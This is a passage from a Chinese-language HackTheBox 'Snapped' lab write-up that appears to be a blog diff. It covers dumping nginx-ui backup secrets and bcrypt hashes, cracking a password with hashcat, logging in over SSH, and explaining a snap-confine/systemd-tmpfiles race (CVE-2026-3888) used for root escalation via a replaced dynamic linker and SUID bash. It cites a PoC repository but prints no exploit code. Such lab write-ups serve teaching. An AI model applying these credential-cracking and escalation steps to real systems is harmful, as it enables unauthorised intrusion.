+<p>开头的 <code>l</code> 是 link 的意思，表示该文件只是符号链接，其真实的地址在 <code>-&gt;</code> 指向的位置，因此转而查看 <code>sites-available</code> 这个目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx# <span class="built_in">ls</span> -l sites-available/</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root root 463 Apr 29 10:27 nginx-ui</span><br><span class="line">-rw-r--r-- 1 root root 264 Apr 29 10:27 snapped</span><br></pre></td></tr></table></figure>
+
+<p>依次查看：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx/sites-available# <span class="built_in">cat</span> nginx-ui </span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name admin.snapped.htb;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:9000;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line"></span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        proxy_set_header Connection <span class="string">&quot;upgrade&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就说明了：</p>
+<ul>
+<li><code>admin.snapped.htb</code> 是作为 <code>127.0.0.1:9000</code> 的反向代理存在的</li>
+<li>9000 端口应该就是之前看到的 Nginx Ui</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx/sites-available# <span class="built_in">cat</span> snapped </span><br><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name snapped.htb;</span><br><span class="line"></span><br><span class="line">    root /var/www/html/snapped;</span><br><span class="line">    index index.html;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$host</span> != snapped.htb) &#123;</span><br><span class="line">        rewrite ^ http://snapped.htb/;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信息：</p>
+<ul>
+<li>根目录为：<code>/var/www/html/snapped</code></li>
+<li>对于任何不是 <code>snapped.htb</code> 的主机，它都有一条重写规则，这也印证了我们之前用 IP 访问 80 会重定向到 <code>snapped.htb</code></li>
+</ul>
+<h3 id="2、nginx-ui"><a href="#2、nginx-ui" class="headerlink" title="2、nginx-ui"></a>2、nginx-ui</h3><p>目录结构：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# <span class="built_in">ls</span> -l nginx-ui</span><br><span class="line">total 260</span><br><span class="line">-rw-r--r-- 1 root root   2295 Apr 29 10:27 app.ini</span><br><span class="line">-rw-r--r-- 1 root root 262144 Apr 29 10:27 database.db</span><br></pre></td></tr></table></figure>
+
+<p>有两个文件，先看 <code>app.ini</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx-ui# <span class="built_in">cat</span> app.ini </span><br><span class="line">[server]</span><br><span class="line">RunMode           = release</span><br><span class="line">HttpPort          = 9000</span><br><span class="line">HTTPChallengePort = 9180</span><br><span class="line">Host              = 127.0.0.1</span><br><span class="line">Port              = 9000</span><br><span class="line">BaseUrl           = </span><br><span class="line">EnableHTTPS       = <span class="literal">false</span></span><br><span class="line">SSLCert           = </span><br><span class="line">SSLKey            = </span><br><span class="line">EnableH2          = <span class="literal">false</span></span><br><span class="line">EnableH3          = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">[nginx]</span><br><span class="line">ConfigDir       = /etc/nginx</span><br><span class="line">BinaryPath      = /usr/sbin/nginx</span><br><span class="line">AccessLogPath   = /var/log/nginx/access.log</span><br><span class="line">ErrorLogPath    = /var/log/nginx/error.log</span><br><span class="line">LogDirWhiteList = </span><br><span class="line">ConfigPath      = </span><br><span class="line">PIDPath         = </span><br><span class="line">SbinPath        = </span><br><span class="line">TestConfigCmd   = </span><br><span class="line">ReloadCmd       = </span><br><span class="line">RestartCmd      = </span><br><span class="line">StubStatusPort  = 0</span><br><span class="line">ContainerName   = </span><br><span class="line"></span><br><span class="line">[database]</span><br><span class="line">Path = /var/lib/nginx-ui/database.db</span><br><span class="line">Name = database</span><br><span class="line"></span><br><span class="line">[app]</span><br><span class="line">PageSize  = 20</span><br><span class="line">JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9</span><br><span class="line"></span><br><span class="line">[<span class="built_in">log</span>]</span><br><span class="line">EnableFileLog = <span class="literal">false</span></span><br><span class="line">Dir           = </span><br><span class="line">MaxSize       = 0</span><br><span class="line">MaxAge        = 0</span><br><span class="line">MaxBackups    = 0</span><br><span class="line">Compress      = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">[sls]</span><br><span class="line">AccessKeyId         = </span><br><span class="line">AccessKeySecret     = </span><br><span class="line">EndPoint            = </span><br><span class="line">ProjectName         = </span><br><span class="line">APILogStoreName     = </span><br><span class="line">DefaultLogStoreName = </span><br><span class="line">Source              = </span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">IPWhiteList         = </span><br><span class="line">BanThresholdMinutes = 10</span><br><span class="line">MaxAttempts         = 10</span><br><span class="line"></span><br><span class="line">[backup]</span><br><span class="line">GrantedAccessPath = </span><br><span class="line"></span><br><span class="line">[casdoor]</span><br><span class="line">Endpoint        = </span><br><span class="line">ExternalUrl     = </span><br><span class="line">ClientId        = </span><br><span class="line">ClientSecret    = </span><br><span class="line">CertificatePath = </span><br><span class="line">Organization    = </span><br><span class="line">Application     = </span><br><span class="line">RedirectUri     = </span><br><span class="line"></span><br><span class="line">[cert]</span><br><span class="line">RecursiveNameservers = </span><br><span class="line">Email                = admin@test.htb</span><br><span class="line">CADir                = </span><br><span class="line">RenewalInterval      = 7</span><br><span class="line">HTTPChallengePort    = 9180</span><br><span class="line"></span><br><span class="line">[cluster]</span><br><span class="line">Node = </span><br><span class="line"></span><br><span class="line">[crypto]</span><br><span class="line">Secret = 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line">GithubProxy        = </span><br><span class="line">InsecureSkipVerify = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">[logrotate]</span><br><span class="line">Enabled  = <span class="literal">false</span></span><br><span class="line">CMD      = logrotate /etc/logrotate.d/nginx</span><br><span class="line">Interval = 1440</span><br><span class="line"></span><br><span class="line">[nginx_log]</span><br><span class="line">IndexingEnabled          = <span class="literal">false</span></span><br><span class="line">IndexPath                = </span><br><span class="line">IncrementalIndexInterval = 0</span><br><span class="line"></span><br><span class="line">[node]</span><br><span class="line">Name                 = </span><br><span class="line">Secret               = c64d7ca1-19cb-4ebe-96d4-49037e7df78e</span><br><span class="line">SkipInstallation     = <span class="literal">false</span></span><br><span class="line">Demo                 = <span class="literal">false</span></span><br><span class="line">ICPNumber            = </span><br><span class="line">PublicSecurityNumber = </span><br><span class="line"></span><br><span class="line">[openai]</span><br><span class="line">BaseUrl              = </span><br><span class="line">Token                = </span><br><span class="line">Proxy                = </span><br><span class="line">Model                = </span><br><span class="line">APIType              = OPEN_AI</span><br><span class="line">EnableCodeCompletion = <span class="literal">false</span></span><br><span class="line">CodeCompletionModel  = </span><br><span class="line"></span><br><span class="line">[terminal]</span><br><span class="line">StartCmd = login</span><br><span class="line"></span><br><span class="line">[webauthn]</span><br><span class="line">RPDisplayName = </span><br><span class="line">RPID          = </span><br><span class="line">RPOrigins     = </span><br></pre></td></tr></table></figure>
+
+<p>这应该就是 nginx ui 的配置文件，信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Email = admin@test.htb</span><br></pre></td></tr></table></figure>
+
+<p>还有一个文件是 SQLite 数据库文件，可以直接用 <code>sqlite3</code> 提取文件中的信息。</p>
+<blockquote>
+<p>SQLite 是一个把整个数据库放在一个文件里的“轻量级数据库”。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx-ui# sqlite3 database.db</span><br><span class="line">SQLite version 3.40.1 2022-12-28 14:03:47</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; </span><br></pre></td></tr></table></figure>
+
+<p>进入了交互式界面，查看有哪些表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .table</span><br><span class="line">acme_users         configs            namespaces         sites            </span><br><span class="line">auth_tokens        dns_credentials    nginx_log_indices  streams          </span><br><span class="line">auto_backups       dns_domains        nodes              upstream_configs </span><br><span class="line">ban_ips            external_notifies  notifications      users            </span><br><span class="line">certs              llm_sessions       passkeys         </span><br><span class="line">config_backups     migrations         site_configs </span><br></pre></td></tr></table></figure>
+
+<p>查看 user 表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite&gt; SELECT * FROM users;</span><br><span class="line">1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g</span><br><span class="line"></span><br><span class="line">|²7DĪ:𔕨½\ԝD°Oҽu#,|en</span><br><span class="line">2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,¸§զ»H򉿹e)5U¡К笕KĦ&quot;D¨°Ɨ|en</span><br></pre></td></tr></table></figure>
+
+<p>看到了两个用户（其中一个是 admin），还有对应的哈希值。</p>
+<p>哈希值以 <code>$2</code> 开头，并且总字符数为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx-ui<span class="comment"># python3</span></span><br><span class="line">Python <span class="number">3.11</span><span class="number">.2</span> (main, Apr <span class="number">28</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">11</span>:<span class="number">48</span>) [GCC <span class="number">12.2</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&quot;$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line"><span class="number">60</span></span><br></pre></td></tr></table></figure>
+
+<p>这就基本可以判定，这就是 bcrypt hash。</p>
+<p>拿 Admin 的 bcrypt hash 进行分解：</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$2a$</code></td>
+<td>bcrypt 版本标识</td>
+<td><code>2a</code> 是最常见的版本</td>
+</tr>
+<tr>
+<td><code>10$</code></td>
+<td>Cost Factor（成本因子）</td>
+<td>2^10 &#x3D; 1024 次迭代，安全但不算特别强</td>
+</tr>
+<tr>
+<td><code>8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm</code></td>
+<td>实际哈希值</td>
+<td>包含 22 位 salt + 31 位 hash</td>
+</tr>
+</tbody></table>
+<p>建立一个文件存放 Hash：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<p>写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm</span><br><span class="line">$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>hashcat</code> 进行本地爆破：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat <span class="built_in">hash</span> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -m 3200</span><br></pre></td></tr></table></figure>
+
+<p>不久就能跑出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark</span><br></pre></td></tr></table></figure>
+
+<p>即用户 jonathan 的明文密码为：linkinpark</p>
+<p>但是，admin 用户的 hash 爆破了很久还是没有出来，因为判定题目就是不让你爆破，只让你登入普通账户然后走提权的思路。</p>
+<h2 id="八、User-Flag"><a href="#八、User-Flag" class="headerlink" title="八、User Flag"></a>八、User Flag</h2><p>还记得目标是开放着 22 端口的，直接登入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup/nginx-ui# ssh jonathan@10.129.45.91</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.129.45.91 (10.129.45.91)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.</span></span><br><span class="line"><span class="string">This host key is known by the following other names/addresses:</span></span><br><span class="line"><span class="string">    ~/.ssh/known_hosts:1: [hashed name]</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.129.45.91<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jonathan@10.129.45.91&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">1 update can be applied immediately.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: <span class="built_in">sudo</span> pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: <span class="built_in">sudo</span> apt update</span><br><span class="line">Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5</span><br><span class="line">jonathan@snapped:~$ </span><br></pre></td></tr></table></figure>
+
+<p>拿到普通用户的 shell，在其家目录中就能找到用户 flag：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429211316599.png" alt="file-20260429211316599"></p>
+<h2 id="九、CVE-2026-3888"><a href="#九、CVE-2026-3888" class="headerlink" title="九、CVE-2026-3888"></a>九、CVE-2026-3888</h2><p>接下来就是想如何提权成 root 用户。</p>
+<p>查看当前用户有哪些 <code>sudo</code> 权限的命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">3d637113e773040f43dfe7ee2db9f800</span><br><span class="line">jonathan@snapped:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> jonathan: </span><br><span class="line">Sorry, user jonathan may not run <span class="built_in">sudo</span> on snapped.</span><br></pre></td></tr></table></figure>
+
+<p>找不到。</p>
+<p>查找有 SUID 且属主为 root 的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ find / -<span class="built_in">type</span> f -perm -04000 -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line">      293    133 -rwsr-xr-x   1 root     root       135960 Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine</span><br><span class="line">      880     72 -rwsr-xr-x   1 root     root        72712 Feb  6  2024 /snap/core22/1564/usr/bin/chfn</span><br><span class="line">      886     44 -rwsr-xr-x   1 root     root        44808 Feb  6  2024 /snap/core22/1564/usr/bin/chsh</span><br><span class="line">      952     71 -rwsr-xr-x   1 root     root        72072 Feb  6  2024 /snap/core22/1564/usr/bin/gpasswd</span><br><span class="line">     1036     47 -rwsr-xr-x   1 root     root        47488 Apr  9  2024 /snap/core22/1564/usr/bin/mount</span><br><span class="line">     1045     40 -rwsr-xr-x   1 root     root        40496 Feb  6  2024 /snap/core22/1564/usr/bin/newgrp</span><br><span class="line">     1060     59 -rwsr-xr-x   1 root     root        59976 Feb  6  2024 /snap/core22/1564/usr/bin/passwd</span><br><span class="line">     1178     55 -rwsr-xr-x   1 root     root        55680 Apr  9  2024 /snap/core22/1564/usr/bin/su</span><br><span class="line">     1179    227 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /snap/core22/1564/usr/bin/sudo</span><br><span class="line">     1239     35 -rwsr-xr-x   1 root     root        35200 Apr  9  2024 /snap/core22/1564/usr/bin/umount</span><br><span class="line">     1331     35 -rwsr-xr--   1 root     uuidd       35112 Oct 25  2022 /snap/core22/1564/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">     2600    331 -rwsr-xr-x   1 root     root       338536 Jun 26  2024 /snap/core22/1564/usr/lib/openssh/ssh-keysign</span><br><span class="line">     8626     19 -rwsr-xr-x   1 root     root        18736 Feb 26  2022 /snap/core22/1564/usr/libexec/polkit-agent-helper-1</span><br><span class="line">    27181     64 -rwsr-xr-x   1 root     root        64152 May 30  2024 /usr/bin/passwd</span><br><span class="line">    26576     40 -rwsr-xr-x   1 root     root        39296 Apr  8  2024 /usr/bin/fusermount3</span><br><span class="line">    36279     40 -rwsr-xr-x   1 root     root        39296 Mar  6 11:00 /usr/bin/umount</span><br><span class="line">    72996     16 -rwsr-xr-x   1 root     root        14656 Sep 23  2025 /usr/bin/vmware-user-suid-wrapper</span><br><span class="line">    39252     56 -rwsr-xr-x   1 root     root        55680 Mar  6 11:00 /usr/bin/su</span><br><span class="line">    27092     76 -rwsr-xr-x   1 root     root        76248 May 30  2024 /usr/bin/gpasswd</span><br><span class="line">    26409    272 -rwsr-xr-x   1 root     root       277936 Mar  2 07:56 /usr/bin/sudo</span><br><span class="line">    25924     72 -rwsr-xr-x   1 root     root        72792 May 30  2024 /usr/bin/chfn</span><br><span class="line">    48592     32 -rwsr-xr-x   1 root     root        30952 Dec  2  2024 /usr/bin/pkexec</span><br><span class="line">    26915     44 -rwsr-xr-x   1 root     root        44760 May 30  2024 /usr/bin/chsh</span><br><span class="line">    35539     52 -rwsr-xr-x   1 root     root        51584 Mar  6 11:00 /usr/bin/mount</span><br><span class="line">    27438     40 -rwsr-xr-x   1 root     root        40664 May 30  2024 /usr/bin/newgrp</span><br><span class="line">    72088    336 -rwsr-xr-x   1 root     root       342632 Mar  4 12:55 /usr/lib/openssh/ssh-keysign</span><br><span class="line">    28055     36 -rwsr-xr--   1 root     messagebus    34960 Aug  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">    52729     20 -rwsr-xr-x   1 root     root          18736 Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">    35133    156 -rwsr-xr-x   1 root     root         159016 Aug 20  2024 /usr/lib/snapd/snap-confine</span><br><span class="line">    34789     16 -rwsr-sr-x   1 root     root          14488 Oct 23  2025 /usr/lib/xorg/Xorg.wrap</span><br><span class="line">    42135    412 -rwsr-xr--   1 root     dip          420416 Apr  3  2024 /usr/sbin/pppd</span><br></pre></td></tr></table></figure>
+
+<p>没有常规的 SUID 提权，但是了解 HackTheBox 的应该都知道，靶机的命名是很有讲究的，本靶机的名字叫做 Snapped，因此我们可以重点关注：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/snap/snapd/21759/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统中 Snap 相关组件的版本信息：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ snap version</span><br><span class="line">snap    2.63.1+24.04</span><br><span class="line">snapd   2.63.1+24.04</span><br><span class="line">series  16</span><br><span class="line">ubuntu  24.04</span><br><span class="line">kernel  6.17.0-19-generic</span><br><span class="line">jonathan@snapped:~$ </span><br></pre></td></tr></table></figure>
+
+<p>搜索提权 CVE：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429212523802.png" alt="file-20260429212523802"></p>
+<blockquote>
+<p>这里还是提到了之前说的技巧，即引入特殊的信息（snap-confine）。</p>
+</blockquote>
+<p>这个仓库（<code>https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE</code>）中有 Poc，可以直接提权至 root。</p>
+<p>先介绍一下这个 CVE，下面是漏洞数据库（<code>[NVD - CVE-2026-3888 --- NVD - CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888)</code>）中的描述：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260430150512241.png" alt="file-20260430150512241"></p>
+<p>漏洞出现的原因在于 <code>snap-confine</code> 与 <code>systemd-tmpfiles</code> 这两个系统组件之间的交互缺陷。</p>
+<p><code>systemd-tmpfiles</code> 会以 root 身份每天运行一次，会自动清理 <code>/tmp</code> 中超过时间阈值的旧文件和目录，具体的时间在配置文件中可以看到：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ <span class="built_in">cat</span> /usr/lib/tmpfiles.d/tmp.conf</span><br><span class="line"><span class="comment">#  This file is part of systemd.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  systemd is free software; you can redistribute it and/or modify it</span></span><br><span class="line"><span class="comment">#  under the terms of the GNU Lesser General Public License as published by</span></span><br><span class="line"><span class="comment">#  the Free Software Foundation; either version 2.1 of the License, or</span></span><br><span class="line"><span class="comment">#  (at your option) any later version.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See tmpfiles.d(5) for details</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear tmp directories separately, to make them easier to override</span></span><br><span class="line">D /tmp 1777 root root 4m</span><br><span class="line"><span class="comment">#q /var/tmp 1777 root root 30d</span></span><br></pre></td></tr></table></figure>
+
+<p>不难发现，靶场为了复现的方便，特意将时间设置成了 4m（4分钟）而不是原本的 30d（30天）。</p>
+<p><code>snap-confine</code> 组件负责为 snap 应用构建沙箱环境，在设置沙箱的时候会在 <code>/tmp/snap-private-tmp/$SNAP/tmp</code>（即沙箱内的 <code>/tmp</code>）下创建 <code>/tmp/.snap</code> 目录（root 所有，<code>mode 0755</code>），用于创建 “mimic”。</p>
+<p>什么是 mimic 呢？</p>
+<p>snap 沙箱使用 squashfs 作为基础文件系统（部分目录是只读的）。当 <code>snap-confine</code> 需要 <code>bind-mount</code> 某个第三方库目录（如 <code>/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0</code>）时 ，它必须先在只读文件系统上<strong>创造一个可写的挂载点</strong>（这个创建挂载点的过程就是 mimic）。</p>
+<p>就以 <code>/usr/lib/x86_64-linux-gnu</code> 为例子：</p>
+<p>首先，<code>/usr/lib/x86_64-linux-gnu</code>，在只读 squashfs 上，不可写。</p>
+<p>第一步：将该目录复制到 <code>/tmp/.snap/</code> 当中作为备份。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount --rbind /usr/lib/x86_64-linux-gnu  /tmp/.snap/usr/lib/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>第二步：将原始位置覆盖为可写层</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -t tmpfs tmpfs  /usr/lib/x86_64-linux-gnu  -o mode=0755</span><br></pre></td></tr></table></figure>
+
+<p>这会在原始只读位置（<code>/usr/lib/x86_64-linux-gnu</code>）挂上空的、可写的 tmpfs。</p>
+<p>第三步：将备份内容回填</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount --<span class="built_in">bind</span> /tmp/.snap/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">mount --<span class="built_in">bind</span> /tmp/.snap/usr/lib/x86_64-linux-gnu/libc.so.6            /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">mount --<span class="built_in">bind</span> /tmp/.snap/usr/lib/x86_64-linux-gnu/libpthread.so.0      /usr/lib/x86_64-linux-gnu/libpthread.so.0</span><br><span class="line">... (逐个 bind-mount 所有文件和子目录)</span><br></pre></td></tr></table></figure>
+
+<p>将第一步中 <code>/tmp/.snap/</code> 下保存的原始备份内容，逐一 <code>bind-mount</code> 回到新 <code>tmpfs</code> 上的原始位置。</p>
+<p>现在得到的效果就是，原始目录中的内容没变，但是有了写权限。</p>
+<p>回到 CVE，<code>systemd-tmpfiles</code> 对 <code>/tmp</code> 中的清理是“一视同仁”的，它不知道 <code>/tmp/.snap</code> 对 <code>snap-confine</code> 的重要性，一旦该目录在 10-30 天内未被访问，就会被自动删除。</p>
+<p>而且 <code>/tmp</code> 本身是全局可写的，这也就意味着攻击者也可以在其中重新创建被删除的目录。</p>
+<p>问题出现了，时间一到 <code>systemd-tmpfiles</code> 将  <code>/tmp/.snap</code> 清理，攻击者在其中伪造了一个 <code>/tmp/.snap</code>，在名字上确实看不出差别，但是这个目录的权限已经从 <code>root</code> 降为其他权限了（攻击者拥有的权限）。</p>
+<p>那么，后续如果 <code>snap-confine</code> 进行了 mimic 操作，攻击者就可以采用竞态条件的方式，<code>/tmp/.snap</code> 中备份的信息进行添加 &#x2F; 替换操作，在回 mount 的时候，这个被替换 &#x2F; 添加的文件就会被写入原始路径。</p>
+<p>以上就是漏洞的原理，至于 Poc，关键就是确认被替换的文件是什么。</p>
+<p>仓库中用到的是 <code>ld-linux-x86-64.so.2</code>，将这个动态链接器替换成了 shellcode。</p>
+<blockquote>
+<p>Linux 上每个动态链接的可执行文件在运行时，内核先加载的不是程序本身，而是动态链接器，由它负责加载所有依赖的 <code>.so</code> 后再把控制权交给程序。</p>
+</blockquote>
+<p>在沙箱内拿到 root 后，把 <code>/bin/bash</code> 复制到 <code>/var/snap/firefox/common/</code> 并设 SUID，从宿主机执行它来逃逸沙箱，最终获得宿主机的 root shell。</p>
+<p>将项目克隆到本地，这个 Poc 也有利用的要求：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260430153735934.png" alt="file-20260430153735934"></p>
+<p>首先第一个是 OS Version：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ <span class="built_in">cat</span> /etc/issue</span><br><span class="line">Ubuntu 24.04.4 LTS \n \l</span><br></pre></td></tr></table></figure>
+
+<p>刚好是描述中提到的版本之一。</p>
+<p>第两点要求我们之前已经验证过了，验证后三点：</p>
